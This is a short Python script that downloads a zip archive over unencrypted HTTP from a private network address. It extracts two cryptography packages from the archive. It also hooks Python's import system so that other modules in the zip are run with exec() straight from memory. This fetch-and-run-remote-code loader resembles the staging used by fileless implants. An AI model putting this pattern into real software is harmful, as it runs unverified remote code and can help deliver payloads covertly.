from __future__ import division
from __future__ import print_function
import urllib.request
from zipfile import ZipFile
from io import BytesIO
import sys
import os
import importlib
import importlib.util
from pprint import pprint

PACKAGES_TO_FS = ("Cryptodome", "cryptography")

url = "http://192.168.222.128:8000/packages.zip"

with urllib.request.urlopen(url) as r:
    zip_bytes = BytesIO(r.read())

zip_file = ZipFile(zip_bytes)
test = []
class MyImporter():

    def __init__(self):
        self.parts = None
        self.fs_path = None
        self.path = None
        self.submodule = None
        self.m_is_package = None

    def find_module(self, fullname, path=None):
        self.parts = fullname.split('.')
        self.path = '/'.join(self.parts)
        self.submodule = self.parts[-1]

        for suffix, is_package in (('.py', False), ('/__init__.py', True)):
            self.fs_path = self.path + suffix
            try:
                zip_file.getinfo(self.fs_path)
                print(f"Success! Entry {self.fs_path} was found")
                self.m_is_package = is_package
                return self
            except:
                print(f"Warn! No entry found in zip with name {self.fs_path}")
                continue
        return None
    
    def load_module(self, fullname):
        source_code = self.__get_code()
        spec = importlib.util.spec_from_loader(fullname, loader=None)
        module = sys.modules.setdefault(fullname, importlib.util.module_from_spec(spec))
        module.__file__ = "<%s>" % self.__class__.__name__
        module.__loader__ = self

        if self.m_is_package:
            module.__path__ = []
            module.__package__ = fullname
        else:
            module.__package__ = fullname.rpartition('.')[0]

        exec(source_code, module.__dict__)
        return module

    def __get_code(self):
        return zip_file.read(self.fs_path).decode()

def fs_import():
    names = zip_file.namelist()
    for package in PACKAGES_TO_FS:
        parts = package.split('.')
        member = '/'.join(parts)

        for file in names:
            if file.startswith(package):
                try:
                    zip_file.extract(file)
                except:
                    print(f"Warn! No such file {file}")
                    continue
    sys.path.append(os.getcwd())


my_imp = MyImporter()
fs_import()
sys.meta_path.append(my_imp)
#